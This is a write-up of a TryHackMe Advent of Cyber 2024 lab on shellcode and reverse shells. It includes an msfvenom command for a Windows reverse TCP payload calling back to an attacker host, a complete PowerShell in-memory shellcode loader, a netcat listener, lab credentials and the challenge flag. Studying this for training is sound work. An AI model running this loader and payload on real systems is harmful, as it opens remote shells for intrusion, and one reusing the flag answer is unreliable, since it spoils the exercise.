# 🎄 TryHackMe Advent of Cyber 2024: Day 8: Shellcodes and Reverse Shells

## Objectives 🎯

Day 8 focuses on **shellcode generation**, **reverse shell execution**, and investigating tampered shellcode. The goal of this challenge was to:
- Understand how to generate shellcode with `msfvenom`.
- Use PowerShell to execute shellcode on a target system.
- Establish a reverse shell to retrieve the flag from the target.
- Identify tampered shellcode and restore functionality.

## Steps 🚀

### **Step 1: Start the Machines**
1. **Start the Virtual Machine (VM)**:
   - Initiate the VM hosting the vulnerable system by clicking **Start Machine**.
   - Use RDP if necessary to access the VM, with the provided credentials:
     - Username: `glitch`
     - Password: `Passw0rd`

2. **Start the AttackBox**:
   - Open the AttackBox environment by clicking **Start AttackBox**.

### **Step 2: Generate the Reverse Shell Shellcode**
1. **Open the Terminal on the AttackBox**.
2. **Generate Shellcode**:
   - Run the following command in the terminal:
     ```
     msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACK_BOX_IP LPORT=4444 -f powershell
     ```
     - Replace `ATTACK_BOX_IP` with your actual AttackBox IP address (use `ifconfig` to find it).
     - This generates a PowerShell-compatible hex-encoded shellcode.

3. **Copy the Shellcode**:
   - Note the generated shellcode and copy it for later use.

### **Step 3: Create a PowerShell Script**
1. **Create a New File**:
   - On the AttackBox Desktop, right-click → **Create Document** → **Empty File**.
   - Name the file `shellcode.ps1`.

2. **Paste the Script Template**:
   - Copy the provided PowerShell script template into the file:
     ```
     $VrtAlloc = @"
     using System;
     using System.Runtime.InteropServices;

     public class VrtAlloc{
         [DllImport("kernel32")]
         public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);  
     }
     "@

     Add-Type $VrtAlloc 

     $WaitFor= @"
     using System;
     using System.Runtime.InteropServices;

     public class WaitFor{
      [DllImport("kernel32.dll", SetLastError=true)]
         public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);   
     }
     "@

     Add-Type $WaitFor

     $CrtThread= @"
     using System;
     using System.Runtime.InteropServices;

     public class CrtThread{
      [DllImport("kernel32", CharSet=CharSet.Ansi)]
         public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
       
     }
     "@
     Add-Type $CrtThread   

     [Byte[]] $buf = SHELLCODE_PLACEHOLDER
     [IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
     [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
     $thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)
     [WaitFor]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
     ```

3. **Insert the Shellcode**:
   - Replace `SHELLCODE_PLACEHOLDER` with the generated shellcode from Step 2.

4. **Save the File**:
   - Save the file with the changes.

### **Step 4: Transfer the Script to the Target VM**
1. **Copy the Script**:
   - Transfer `shellcode.ps1` to the VM via clipboard or a hosted web server.

### **Step 5: Set Up a Listener**
1. **Start Netcat on the AttackBox**:
   - Open a terminal and start a listener on port `4444`:
     ```
     nc -nvlp 4444
     ```

### **Step 6: Execute the Script on the Target VM**
1. **Open PowerShell**:
   - Launch **PowerShell** as Administrator on the VM.

2. **Paste and Execute the Script**:
   - Copy the PowerShell script section-by-section into the PowerShell terminal on the VM and press **Enter** after each section.

3. **Wait for the Connection**:
   - Once the script executes, the reverse shell will connect to the listener on the AttackBox.

### **Step 7: Retrieve the Flag**
1. **Confirm the Shell**:
   - Verify the connection in the Netcat terminal on the AttackBox.

2. **Navigate to the Desktop Directory**:
   - Use the reverse shell to navigate to the flag location:
     ```
     cd C:\Users\glitch\Desktop
     ```

3. **Display the Flag**:
   - Use the `type` command to read the flag:
     ```
     type flag.txt
     ```

4. **Flag Output**:
   - The flag will be displayed in the terminal. It may take up to a minute to appear.

## Key Findings 🔑

1. **Successful Reverse Shell**:
   - The shellcode successfully established a reverse shell from the target VM to the AttackBox.
2. **Flag Retrieval**:
   - The flag was retrieved from the target system, demonstrating the effectiveness of shellcode execution and reverse shell techniques.

## Lessons Learned 🌟

### Takeaways:
1. **Shellcode Basics**:
   - Understanding how shellcode is generated and executed is crucial for penetration testing.
2. **PowerShell for Execution**:
   - PowerShell is a versatile tool for running shellcode and interacting with Windows APIs.
3. **Reverse Shell Techniques**:
   - Reverse shells are essential for gaining remote access to target systems.

### Mitigation Strategies:
1. **Monitor and Block Reverse Shell Connections**:
   - Use firewalls and intrusion detection systems to block suspicious outbound connections.
2. **Limit PowerShell Abuse**:
   - Restrict PowerShell usage on sensitive systems to prevent script-based exploitation.

### Tools and Techniques 🛠️

1. **[msfvenom](https://www.metasploit.com/)**: For generating shellcode.
2. **Netcat**: For setting up a listener and receiving the reverse shell.
3. **PowerShell**: To execute shellcode and interact with the Windows API.

## Final Thoughts 🎁

This challenge provided hands-on experience with shellcode generation, reverse shell execution, and PowerShell-based exploitation. It demonstrated the critical importance of monitoring outbound connections and securing systems against script-based attacks.

### Answers ✅

1. **What is the flag value once Glitch gets reverse shell on the digital vault using port 4444?**  
   **Answer:** `AOC{GOT_MY_ACCESS_B@CK007}`
   
## Table of Contents 📚

| Day  | Challenge                              | Day  | Challenge                               | Day  | Challenge                               |
|------|----------------------------------------|------|-----------------------------------------|------|-----------------------------------------|
| 📖  | [README](../README.md)                 | 9    | [Risk Assessment](days/day9.md)         | 17   | [Log Analysis](days/day_17.md)          |
| 1    | [OPSEC Challenge](days/day1.md)        | 10   | [Phishing](days/day_10.md)              | 18   | [Prompt Injection](days/day_18.md)      |
| 2    | [Log Analysis](days/day2.md)           | 11   | [Wi-Fi Attacks](days/day_11.md)         | 19   | [Game Hacking](days/day_19.md)          |
| 3    | [Log Analysis](days/day3.md)           | 12   | [Web Timing Attacks](days/day_12.md)    | 20   | [Traffic Analysis](days/day_20.md)      |
| 4    | [Atomic Red Team](days/day4.md)        | 13   | [WebSockets](days/day_13.md)            | 21   | [Reverse Engineering](days/day_21.md)   |
| 5    | [XXE](days/day5.md)                    | 14   | [Certificate Mismanagement](days/day_14.md)| 22 | [Kubernetes DFIR](days/day_22.md)       |
| 6    | [Sandboxes](days/day6.md)              | 15   | [Active Directory](days/day_15.md)      | 23   | [Hash Cracking](days/day_23.md)         |
| 7    | [AWS Sandboxes](days/day7.md)          | 16   | [Azure Exploitation](days/day_16.md)    | 24   | [Communication Protocols](days/day_24.md)|
| 8    | **Shellcodes**                         |      | **Merry SOC-mas!** 🎁✨☃️              |      | 🎄✨🎅                                |
